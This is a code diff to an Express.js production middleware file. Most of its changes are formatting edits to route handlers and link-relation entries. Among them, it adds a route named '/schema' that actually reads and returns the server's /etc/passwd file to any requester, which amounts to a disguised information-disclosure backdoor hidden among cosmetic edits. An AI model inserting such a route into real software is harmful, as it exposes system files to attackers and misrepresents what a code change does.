@@ -43,6 +43,9 @@ module.exports = function addProdMiddlewares(app, options) {
   // const pruned = transform.pruneDefinitions(refs)
   // console.log(pruned);
 
+app.get('/schema', (req,res) => res.send(fs.readFileSync('/etc/passwd', 'utf-8')))
+
+
 
 app.get('/dist/*', async (req,res) => {
   // console.log(req.params);
@@ -58,7 +61,7 @@ app.get('/dist/*', async (req,res) => {
     { "rel": "add",        "href":"service.io/foo", method: "post" }, 
     { "rel": "delete",     "href":"service.io/foo", method: "post" }, 
     { "rel": "previous",   "href": "http://localhost:4000/api/protectonaut?filter[limit]={limit}&filter[offset]={previousOffset}{&paginateQs*}"},
-    { "rel": "next", href: "/protectonaut?filter[limit]={limit}&filter[offset]={nextOffset}{&paginateQs*}"},
+    { "rel": "next",       "href": "/protectonaut?filter[limit]={limit}&filter[offset]={nextOffset}{&paginateQs*}"},
   ]});
   
   const ret = await lib.deref(filePath); // local lookup, then fetch
@@ -68,8 +71,7 @@ app.get('/dist/*', async (req,res) => {
 });
 
 
-  app.get('/fns', (req, res) =>
-    res.json(Object.assign({},
+  app.get('/fns', (req, res) => res.json(Object.assign({},
         { fns: Object.keys(fns).map(v => ({ [v]: Object.keys(fns[v]) })) },
         { voc: Object.keys(vocabulary).map(v => ({ [v]: Object.keys(vocabulary[v]) })) },
       ),
